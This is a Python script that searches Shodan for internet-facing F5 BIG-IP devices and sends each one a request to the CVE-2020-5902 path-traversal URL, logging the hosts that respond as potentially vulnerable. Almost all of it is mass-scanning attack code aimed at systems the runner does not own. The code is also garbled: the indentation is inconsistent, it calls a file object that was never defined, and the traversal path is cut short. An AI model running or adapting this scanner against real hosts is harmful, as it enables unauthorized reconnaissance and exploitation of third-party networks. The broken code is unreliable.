#!/usr/bin/env python
#
# F5.py
# Search SHODAN for F5 BIG IP vulnerable devices
# Checks for:
# CVE-2020-5902
# Author: cbk914

import shodan
import json
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'http.title:"BIG-IP&reg;- Redirect"'

session = requests.Session()

def login (IP,PORT,CC):
	try:
		if PORT == "443":
			http_type = "https"
		else:
			http_type = "http"
		rawBody = "`{""}`"
		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+"/login","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
		response = session.post(""+http_type+"://"+IP+":"+PORT+"/tmui/login.jsp/..;/tmui...", data=rawBody, headers=headers, verify=False)
		if response.status_code == 200:
			print ("[*]Found F5 device potentially vulnerable to CVE-2020-5902 ... Logging to file.[*]")
	    	text_file.open("/tmp/f5.log")
            text_file.write(""+http_type+"://"+IP+":"+PORT+"/tmui/login.jsp/..;/tmui...\n")
			text_file.close()
		else:
			print ("[*]Not Reachable[*]")
	except Exception as e:
		print('Error: %s' % e)






try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = str(service['ip_str'])
				PORT = str(service['port'])
                CC = service['location']['country_name']
				login (IP,PORT,CC)

				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)